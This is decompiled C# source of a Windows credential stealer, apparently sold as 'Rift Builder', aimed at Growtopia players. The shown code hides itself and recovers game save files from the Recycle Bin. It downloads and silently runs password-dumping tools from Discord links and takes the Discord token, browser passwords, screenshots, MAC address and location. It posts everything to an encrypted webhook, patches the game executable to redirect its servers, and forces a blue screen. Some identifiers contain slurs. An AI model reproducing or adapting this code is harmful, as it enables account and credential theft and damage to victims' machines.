using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace CommonLanguageRuntimeLibrary
{
	// Token: 0x02000004 RID: 4
	internal class Program
	{
		// Token: 0x0600000B RID: 11 RVA: 0x000020E4 File Offset: 0x000002E4
		private static void bsod()
		{
			bool flag;
			Program.RtlAdjustPrivilege(19, true, false, out flag);
			uint num;
			Program.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002114 File Offset: 0x00000314
		private static void corrupt()
		{
			string str = "";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Growtopia");
			Process[] processesByName = Process.GetProcessesByName("Growtopia");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			if (registryKey != null)
			{
				str = registryKey.GetValue("path").ToString();
			}
			try
			{
				string text = Encoding.Default.GetString(File.ReadAllBytes(str + "\\Growtopia.exe"));
				int startIndex = text.IndexOf("growtopia1.com");
				int startIndex2 = text.IndexOf("growtopia2.com");
				string value = "growtopia7.com";
				text = text.Remove(startIndex, 14).Insert(startIndex, value);
				text = text.Remove(startIndex2, 14).Insert(startIndex2, value);
				File.WriteAllBytes(str + "\\Growtopia.exe", Encoding.Default.GetBytes(text));
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002208 File Offset: 0x00000408
		private static void ExtractMeDaddy(string resource, string path)
		{
			using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))
			{
				using (FileStream fileStream = new FileStream(path + "\\" + resource, FileMode.Create, FileAccess.Write))
				{
					manifestResourceStream.CopyTo(fileStream);
					fileStream.Close();
					Process.Start(path + "\\" + resource);
				}
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002288 File Offset: 0x00000488
		private static bool IsDigitsOnly(string str)
		{
			foreach (char c in str)
			{
				if (c < '0' || c > '9')
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000022C1 File Offset: 0x000004C1
		private static void ImNotGayBut5BucksIs5Bucks()
		{
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000022C4 File Offset: 0x000004C4
		private static void blockish(string site)
		{
			string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			StreamWriter streamWriter = new StreamWriter(path, true);
			string value = "\n 127.0.0.1 " + site;
			streamWriter.Write(value);
			streamWriter.Close();
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000022F8 File Offset: 0x000004F8
		private static void Main(string[] args)
		{
			Path.GetTempPath();
			try
			{
				File.SetAttributes(Assembly.GetEntryAssembly().Location, File.GetAttributes(Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
			Program.RecoverSaveDats2();
			Program.Info();
			if (Program.start)
			{
				Program.startupppp();
			}
			Program.corrupt();
			Program.ImNotGayBut5BucksIs5Bucks();
			Program.bsod();
			Tracer.TraceSave();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000236C File Offset: 0x0000056C
		public static void Info()
		{
			byte[] bytes = new WebClient().DownloadData("https://ipinfo.io");
			string @string = Encoding.UTF8.GetString(bytes);
			string str = @string.Substring(@string.IndexOf("country") + 11, @string.IndexOf("loc", @string.IndexOf("country")) - 6 - (@string.IndexOf("country") + 11));
			string text = @string.Substring(@string.IndexOf("region") + 10, @string.IndexOf("country", @string.IndexOf("region")) - 6 - (@string.IndexOf("region") + 10));
			string text2 = @string.Substring(@string.IndexOf("city") + 8, @string.IndexOf("region", @string.IndexOf("city")) - 6 - (@string.IndexOf("city") + 8));
			string str2 = @string.Substring(@string.IndexOf("timezone") + 12, @string.IndexOf("readme", @string.IndexOf("timezone")) - 6 - (@string.IndexOf("timezone") + 12));
			Program.localip = Program.giveiporgay();
			string plainText = Program.getpass();
			string clearText = "a";
			string machineGuid = Program.GetMachineGuid();
			string clearText2 = Program.GibToken();
			Webhook webhook = new Webhook(Program.Decrypt(Program.hook));
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string text3 = "";
			if (Program.isgt)
			{
				try
				{
					try
					{
						File.Delete(Path.GetTempPath() + "\\pwd.txt");
					}
					catch
					{
					}
					Program.SaveDecrypter();
					new Process
					{
						StartInfo = 
						{
							FileName = "Update.exe",
							WorkingDirectory = Path.GetTempPath(),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						}
					}.Start();
					Thread.Sleep(1500);
					foreach (Process process in Process.GetProcessesByName("Update"))
					{
						process.Kill();
					}
					try
					{
						File.Delete(Path.GetTempPath() + "\\Update.exe");
					}
					catch
					{
					}
				}
				catch
				{
				}
				if (File.Exists(Path.GetTempPath() + "/pwd.txt"))
				{
					string[] array = File.ReadAllText(Path.GetTempPath() + "\\pwd.txt").Split(new char[]
					{
						'='
					});
					Program.growid = array[0];
					Program.passwords = array[1];
					Program.lastworld = array[2];
					Program.mac = array[3];
					string text4 = text3;
					text3 = string.Concat(new string[]
					{
						text4,
						"Save.dat stolen from ",
						Environment.UserName,
						"/",
						Environment.MachineName,
						Environment.NewLine
					});
					text3 = text3 + "GrowID : " + Program.growid + Environment.NewLine;
				}
				else
				{
					string text5 = text3;
					text3 = string.Concat(new string[]
					{
						text5,
						"Save.dat not found ! Info stolen from ",
						Environment.UserName,
						"/",
						Environment.MachineName,
						Environment.NewLine
					});
					Program.growid = "Null";
				}
				Webhook.growid = Program.growid;
				string[] stuff = Program.macxdd();
				string[] array2 = Program.thonk();
				string crypto = Program.crypto();
				string fnum = "113449018";
				string name = "85086763";
				string name2 = "85086763c";
				string contents = Program.Regdata(array2[2], array2[4], "a", "b", "c", "d", crypto, "xd", fnum, name, name2, "xd", "xd", "xd", "xd", stuff);
				string path = Path.GetTempPath() + "/SetReg.reg";
				File.WriteAllText(path, contents);
				if (Program.credo & Program.desktop)
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText2),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid),
						"|",
						Program.Encode(plainText),
						"|",
						Program.DesktopPicture()
					});
				}
				else if (Program.desktop)
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText2),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid),
						"|",
						Program.Encrypt(clearText),
						"|",
						Program.DesktopPicture()
					});
				}
				else if (Program.credo)
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText2),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid),
						"|",
						Program.Encode(plainText)
					});
				}
				else
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText2),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid)
					});
				}
				text3 = text3 + "MAC Address : " + Program.mac + Environment.NewLine;
				text3 = text3 + "Country : " + str + Environment.NewLine;
				string text6 = text3;
				text3 = string.Concat(new string[]
				{
					text6,
					"Region/City : ",
					text,
					"/",
					text2,
					Environment.NewLine
				});
				text3 = text3 + "Time Zone : " + str2 + Environment.NewLine;
				text3 = text3 + "==============================================================" + Environment.NewLine;
				text3 = text3 + "Drag this file to your accounts folder and check the resolver!" + Environment.NewLine;
				text3 = text3 + "Thanks for using Rift Builder, have fun!" + Environment.NewLine;
				text3 = text3 + "- Grando *kisses you on the cheek*" + Environment.NewLine;
				if (Program.pong)
				{
					text3 += "@everyone";
				}
				webhook.SendMessage(text3, Program.cipher);
				using (GayBowser gayBowser = new GayBowser())
				{
					gayBowser.WebHook = Program.Decrypt(Program.hook);
					gayBowser.SendAttachment(path);
					gayBowser.Dispose();
					goto IL_B7C;
				}
			}
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			string a = string.Empty;
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (a == string.Empty)
				{
					networkInterface.GetIPProperties();
					a = networkInterface.GetPhysicalAddress().ToString();
				}
			}
			Program.mac = a;
			string text7 = text3;
			text3 = string.Concat(new string[]
			{
				text7,
				"Data stolen from ",
				Environment.UserName,
				"/",
				Environment.MachineName,
				Environment.NewLine
			});
			text3 = text3 + "MAC Address : " + Program.mac + Environment.NewLine;
			text3 = text3 + "IP : " + Program.localip;
			text3 = text3 + "Country : " + str + Environment.NewLine;
			string text8 = text3;
			text3 = string.Concat(new string[]
			{
				text8,
				"Region/City : ",
				text,
				"/",
				text2,
				Environment.NewLine
			});
			text3 = text3 + "Time Zone : " + str2 + Environment.NewLine;
			text3 = text3 + "==============================================================" + Environment.NewLine;
			text3 = text3 + "Thanks for using Rift Builder, have fun!" + Environment.NewLine;
			text3 = text3 + "- Grando *kisses you on the cheek*" + Environment.NewLine;
			text3 += "=================================================";
			if (Program.pong)
			{
				text3 += "@everyone";
			}
			using (GayBowser gayBowser2 = new GayBowser())
			{
				gayBowser2.WebHook = Program.Decrypt(Program.hook);
				gayBowser2.SendMessage(text3);
				if (Program.credo && Program.desktop)
				{
					string tempPath = Path.GetTempPath();
					Program.desk();
					string contents2 = Program.getpass();
					File.WriteAllText(Path.GetTempPath() + "/BrowserCredentials.txt", contents2);
					gayBowser2.SendAttachment(tempPath + "/screen.jpg");
					gayBowser2.SendAttachment(Path.GetTempPath() + "/BrowserCredentials.txt");
					File.Delete(Path.GetTempPath() + "/BrowserCredentials.txt");
					File.Delete(tempPath + "/screen.jpg");
				}
				else if (Program.credo)
				{
					string contents3 = Program.getpass();
					File.WriteAllText(Path.GetTempPath() + "/BrowserCredentials.txt", contents3);
					gayBowser2.SendAttachment(Path.GetTempPath() + "/BrowserCredentials.txt");
					File.Delete(Path.GetTempPath() + "/BrowserCredentials.txt");
				}
				else if (Program.desktop)
				{
					string tempPath2 = Path.GetTempPath();
					Program.desk();
					gayBowser2.SendAttachment(tempPath2 + "/screen.jpg");
					File.Delete(tempPath2 + "/screen.jpg");
				}
				gayBowser2.Dispose();
			}
			try
			{
				IL_B7C:
				File.Delete(Path.GetTempPath() + "\\pwd.txt");
			}
			catch
			{
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002FA4 File Offset: 0x000011A4
		public static void SaveDecrypters()
		{
			try
			{
				File.Delete(Program.retarded);
			}
			catch
			{
			}
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/624617922647818240/778357631207079956/savedecrypter-trace.exe", Program.retarded);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002FE8 File Offset: 0x000011E8
		private static void RecoverSaveDats2()
		{
			try
			{
				byte[] bytes = new WebClient().DownloadData("https://ipinfo.io");
				string @string = Encoding.UTF8.GetString(bytes);
				string str = @string.Substring(@string.IndexOf("country") + 11, @string.IndexOf("loc", @string.IndexOf("country")) - 6 - (@string.IndexOf("country") + 11));
				string text = @string.Substring(@string.IndexOf("region") + 10, @string.IndexOf("country", @string.IndexOf("region")) - 6 - (@string.IndexOf("region") + 10));
				string text2 = @string.Substring(@string.IndexOf("city") + 8, @string.IndexOf("region", @string.IndexOf("city")) - 6 - (@string.IndexOf("city") + 8));
				string str2 = @string.Substring(@string.IndexOf("timezone") + 12, @string.IndexOf("readme", @string.IndexOf("timezone")) - 6 - (@string.IndexOf("timezone") + 12));
				Path.GetTempPath();
				string text3 = Program.retards;
				if (!Directory.Exists(text3))
				{
					Directory.CreateDirectory(text3);
				}
				string text4 = text3 + "\\RecoverFiles.ps1";
				try
				{
					File.Delete(text4);
				}
				catch
				{
				}
				using (StreamWriter streamWriter = new StreamWriter(text4, true))
				{
					streamWriter.WriteLine(string.Join(Environment.NewLine, new string[]
					{
						"$shell = New-Object -ComObject Shell.Application",
						"$recycleBin = $shell.Namespace(0xA) #Recycle Bin",
						"$recycleBin.Items() | %{Copy-Item $_.Path (\"" + text3 + "\\{0}\" -f ($_.Name+[string](Get-Random)))} -ErrorAction SilentlyContinue"
					}));
				}
				using (Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "powershell.exe",
					Arguments = "-NoProfile -ExecutionPolicy unrestricted -file \"" + text4 + "\"",
					WindowStyle = ProcessWindowStyle.Hidden
				}))
				{
					process.WaitForExit();
				}
				Program.SaveDecrypters();
				DirectoryInfo directoryInfo = new DirectoryInfo(text3);
				FileInfo[] files = directoryInfo.GetFiles("*save*");
				string machineGuid = Program.GetMachineGuid();
				string clearText = Program.GibToken();
				foreach (FileInfo fileInfo in files)
				{
					try
					{
						File.Delete(Program.retards + "/retard.dat");
					}
					catch
					{
					}
					try
					{
						File.Delete(Path.GetTempPath() + "\\pwds.txt");
					}
					catch
					{
					}
					string destFileName = Program.retards + "/retard.dat";
					File.Move(fileInfo.FullName, destFileName);
					new Process
					{
						StartInfo = 
						{
							WorkingDirectory = Program.retards,
							FileName = "Update.exe",
							WindowStyle = ProcessWindowStyle.Hidden
						}
					}.Start();
					Thread.Sleep(1500);
					foreach (Process process2 in Process.GetProcessesByName("Update"))
					{
						process2.Kill();
					}
				}
				string[] array2 = File.ReadAllText(Path.GetTempPath() + "\\pwds.txt").Split(new char[]
				{
					'='
				});
				Program.growid = array2[0];
				Program.passwords = array2[1];
				Program.lastworld = array2[2];
				Program.mac = array2[3];
				Webhook.growid = Program.growid;
				string clearText2 = "a";
				string plainText = Program.getpass();
				if (Program.credo & Program.desktop)
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid),
						"|",
						Program.Encode(plainText),
						"|",
						Program.DesktopPicture()
					});
				}
				else if (Program.desktop)
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid),
						"|",
						Program.Encrypt(clearText2),
						"|",
						Program.DesktopPicture()
					});
				}
				else if (Program.credo)
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid),
						"|",
						Program.Encode(plainText)
					});
				}
				else
				{
					Program.cipher = string.Concat(new string[]
					{
						Program.Encrypt(Program.growid),
						"|",
						Program.Encrypt(Program.passwords),
						"|",
						Program.Encrypt(Program.lastworld),
						"|",
						Program.Encrypt(clearText),
						"|",
						Program.Encrypt(Program.localip),
						"|",
						Program.Encrypt(Program.mac),
						"|",
						Program.Encrypt(Environment.UserName),
						"|",
						Program.Encrypt(machineGuid)
					});
				}
				try
				{
					File.Delete(Program.retarded);
				}
				catch
				{
				}
				try
				{
					File.Delete(Path.GetTempPath() + "\\pwds.txt");
				}
				catch
				{
				}
				Webhook webhook = new Webhook(Program.Decrypt(Program.hook));
				webhook.Name = "Rift Builder";
				webhook.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/751181982846812210/e07b5f632b4ec3d67e05038767cc7149.png?size=128";
				string text5 = "";
				string text6 = text5;
				text5 = string.Concat(new string[]
				{
					text6,
					"Save.dat stolen from ",
					Environment.UserName,
					"/",
					Environment.MachineName,
					" [RECYCLE BIN]",
					Environment.NewLine
				});
				text5 = text5 + "GrowID : " + Program.growid + Environment.NewLine;
				text5 = text5 + "MAC Address : " + Program.mac + Environment.NewLine;
				text5 = text5 + "Country : " + str + Environment.NewLine;
				string text7 = text5;
				text5 = string.Concat(new string[]
				{
					text7,
					"Region/City : ",
					text,
					"/",
					text2,
					Environment.NewLine
				});
				text5 = text5 + "Time Zone : " + str2 + Environment.NewLine;
				text5 = text5 + "==============================================================" + Environment.NewLine;
				text5 = text5 + "Drag this file to your accounts folder and check the resolver!" + Environment.NewLine;
				text5 = text5 + "Thanks for using Rift Builder, have fun!" + Environment.NewLine;
				text5 = text5 + "- Grando *kisses you on the cheek*" + Environment.NewLine;
				if (Program.pong)
				{
					text5 += "@everyone";
				}
				webhook.SendMessage(text5, Program.cipher);
				try
				{
					Directory.Delete(Program.retards);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000039B0 File Offset: 0x00001BB0
		private static void secretlol()
		{
			string path = Environment.ExpandEnvironmentVariables("%TEMP%");
			Program.ExtractMeDaddy("//nigger", path);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000039D4 File Offset: 0x00001BD4
		public static string convb64(string filenamewithpath)
		{
			Bitmap original = new Bitmap(filenamewithpath);
			Bitmap bitmap = new Bitmap(original);
			MemoryStream memoryStream = new MemoryStream();
			bitmap.Save(memoryStream, ImageFormat.Jpeg);
			return Convert.ToBase64String(memoryStream.ToArray());
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00003A0C File Offset: 0x00001C0C
		public static string crypto()
		{
			return string.Concat(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", null));
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00003A38 File Offset: 0x00001C38
		public static string Decrypt(string cipherText)
		{
			string password = Program.encryption;
			cipherText = cipherText.Replace(" ", "+");
			byte[] array = Convert.FromBase64String(cipherText);
			using (Aes aes = Aes.Create())
			{
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, new byte[]
				{
					73,
					118,
					97,
					110,
					32,
					77,
					101,
					100,
					118,
					101,
					100,
					101,
					118
				});
				aes.Key = rfc2898DeriveBytes.GetBytes(32);
				aes.IV = rfc2898DeriveBytes.GetBytes(16);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(array, 0, array.Length);
						cryptoStream.Close();
					}
					cipherText = Encoding.Unicode.GetString(memoryStream.ToArray());
				}
			}
			return cipherText;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003B30 File Offset: 0x00001D30
		public static string DesktopPicture()
		{
			string result;
			try
			{
				string userName = Environment.UserName;
				string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\update.png";
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
					bitmap.Save(text);
					new WebClient();
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection.Add("image", Convert.ToBase64String(File.ReadAllBytes(text)));
					result = Program.convb64(text);
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003C08 File Offset: 0x00001E08
		public static string Encode(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003C38 File Offset: 0x00001E38
		public static string Encrypt(string clearText)
		{
			string password = "Chungus";
			byte[] bytes = Encoding.Unicode.GetBytes(clearText);
			using (Aes aes = Aes.Create())
			{
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, new byte[]
				{
					73,
					118,
					97,
					110,
					32,
					77,
					101,
					100,
					118,
					101,
					100,
					101,
					118
				});
				aes.Key = rfc2898DeriveBytes.GetBytes(32);
				aes.IV = rfc2898DeriveBytes.GetBytes(16);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytes, 0, bytes.Length);
						cryptoStream.Close();
					}
					clearText = Convert.ToBase64String(memoryStream.ToArray());
				}
			}
			return clearText;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003D1C File Offset: 0x00001F1C
		public static string GetMachineGuid()
		{
			string name = "SOFTWARE\\Microsoft\\Cryptography";
			string name2 = "MachineGuid";
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
				{
					object obj = registryKey2.GetValue(name2);
					if (registryKey2 == null)
					{
						obj = "Not Found";
					}
					if (obj == null)
					{
						obj = "Not Found";
					}
					result = obj.ToString();
				}
			}
			return result;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003DB0 File Offset: 0x00001FB0
		public static string getpass()
		{
			string tempPath = Path.GetTempPath();
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/624617932319621153/757177707044929586/WebBrowserPassView.exe", tempPath + "\\resfile.exe");
			webClient.Dispose();
			Process process = new Process();
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = tempPath + "\\resfile.exe",
				Arguments = "/C /stext " + tempPath + "\\browsercreds.txt"
			};
			process.StartInfo = startInfo;
			process.Start();
			Thread.Sleep(500);
			File.Delete(tempPath + "\\resfile.exe");
			string result = File.ReadAllText(tempPath + "\\browsercreds.txt");
			File.Delete(tempPath + "\\browsercreds.txt");
			return result;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003E74 File Offset: 0x00002074
		public static string[] GetRegistry(string str)
		{
			string empty = string.Empty;
			string[] array = new string[15];
			array[0] = str;
			int num = 1;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser;
				registryKey = registryKey.OpenSubKey(str, true);
				foreach (string text in registryKey.GetValueNames())
				{
					try
					{
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(str))
						{
							if (registryKey2 != null)
							{
								try
								{
									byte[] value = (byte[])registryKey2.GetValue(text);
									string text2 = BitConverter.ToString(value);
									if (num <= 10)
									{
										string text3 = text2.Replace("-", ",");
										array[num] = text;
										num++;
										array[num] = text3.ToLower();
										num++;
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
				return array;
			}
			catch (Exception)
			{
			}
			return array;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003F78 File Offset: 0x00002178
		public static string GibToken()
		{
			string result = "";
			try
			{
				string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
				int num;
				while ((num = text.IndexOf("oken")) != -1)
				{
					text = text.Substring(num + "oken".Length);
				}
				string text2 = text.Split(new char[]
				{
					'"'
				})[1];
				result = text2;
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00004000 File Offset: 0x00002200
		public static string giveiporgay()
		{
			return new WebClient
			{
				Proxy = null
			}.DownloadString("http://icanhazip.com/");
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00004028 File Offset: 0x00002228
		public static void desk()
		{
			string tempPath = Path.GetTempPath();
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
				}
				bitmap.Save(tempPath + "/screen.jpg", ImageFormat.Jpeg);
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000040EC File Offset: 0x000022EC
		public static string[] macxdd()
		{
			string empty = string.Empty;
			long num = -1L;
			string[] array = new string[10];
			int num2 = 1;
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.GetPhysicalAddress() != null)
				{
					string s = networkInterface.GetPhysicalAddress().ToString();
					List<string> values = (from i in Enumerable.Range(0, s.Length / 2)
					select s.Substring(i * 2, 2)).ToList<string>();
					string text = string.Join("-", values);
					if (text != "" && num2 <= 10)
					{
						array[num2] = text;
						num2++;
					}
					string text2 = networkInterface.GetPhysicalAddress().ToString();
					if (networkInterface.Speed > num && !string.IsNullOrEmpty(text2) && text2.Length >= 12)
					{
						num = networkInterface.Speed;
					}
				}
			}
			return array;
		}

		// Token: 0x06000023 RID: 35
		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x06000024 RID: 36 RVA: 0x000041E0 File Offset: 0x000023E0
		public static string Regdata(string hkcu1, string hkcu2, string microsoft1, string microsoft2, string microsoft3, string microsoft4, string crypto, string fnum, string fnum2, string name1, string name2, string name3, string name4, string name5, string name6, string[] stuff2)
		{
			string format = "Windows Registry Editor Version 5.00\r\n;MAC ADDRESSES: {15} | {16} | {17} | {18} | {19} | {20} | {21} | {22} | {23}\r\n[HKEY_CURRENT_USER\\{8}]\r\n\"{9}\"=hex:{0}\r\n\"{10}\"=hex:{1}\r\n\r\n;[HKEY_CURRENT_USER\\Software\\Microsoft\\{7}]\r\n;\"{11}\" = hex:{2}\r\n;\"{12}\" = hex:{3}\r\n;\"{13}\" = hex:{4}\r\n;\"{14}\" = hex:{5}\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]\r\n\"MachineGuid\"=\"{6}\"";
			return string.Format(format, new object[]
			{
				hkcu1,
				hkcu2,
				"dont",
				"watch",
				"this",
				"ok?",
				crypto,
				"xd",
				fnum2,
				name1,
				name2,
				"xd",
				"xd",
				"xd",
				"xd",
				stuff2[1],
				stuff2[2],
				stuff2[3],
				stuff2[4],
				stuff2[5],
				stuff2[6],
				stuff2[7],
				stuff2[8],
				stuff2[9]
			});
		}

		// Token: 0x06000025 RID: 37
		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x06000026 RID: 38 RVA: 0x000042B8 File Offset: 0x000024B8
		public static string savedatbru()
		{
			string result;
			try
			{
				RegistryKey registryKey;
				if (Environment.Is64BitOperatingSystem)
				{
					registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
				}
				else
				{
					registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
				}
				try
				{
					registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
					string text = (string)registryKey.GetValue("path");
					if (Directory.Exists(text))
					{
						string text2 = File.ReadAllText(text + "\\save.dat");
						if (text2.Contains("tankid_password") && text2.Contains("tankid_name"))
						{
							string text3 = text + "\\save.dat";
							result = text3;
						}
						else
						{
							string text4 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
							result = text4;
						}
					}
					else
					{
						string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
						result = text5;
					}
				}
				catch
				{
					string text6 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
					result = text6;
				}
			}
			catch
			{
				string text7 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
				result = text7;
			}
			return result;
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000043E0 File Offset: 0x000025E0
		public static void SaveDecrypter()
		{
			try
			{
				File.Delete(Path.GetTempPath() + "Update.exe");
			}
			catch
			{
			}
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/624617922647818240/778356804706631700/savedecrypter-fin.exe", Path.GetTempPath() + "Update.exe");
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00004438 File Offset: 0x00002638
		public static void startupppp()
		{
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "/Intel Technologies";
			if (!Directory.Exists(text))
			{
